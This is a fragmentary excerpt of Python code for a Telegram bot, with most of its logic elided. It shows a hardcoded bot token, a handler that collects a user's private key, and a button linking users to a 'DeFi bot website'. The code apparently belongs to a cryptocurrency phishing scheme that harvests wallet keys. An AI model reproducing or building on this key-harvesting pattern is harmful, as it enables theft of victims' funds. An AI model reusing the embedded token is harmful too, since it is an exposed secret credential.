...
BOT_TOKEN = '6525312849:AAEu00LrZyPa8m2CP1bEZceDY2b1_BtUquk'
...
def process_private_key(message):
    ...
    if private_key.lower() == '/continue':
        ...
        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://shidotoken-web.pages.dev/')
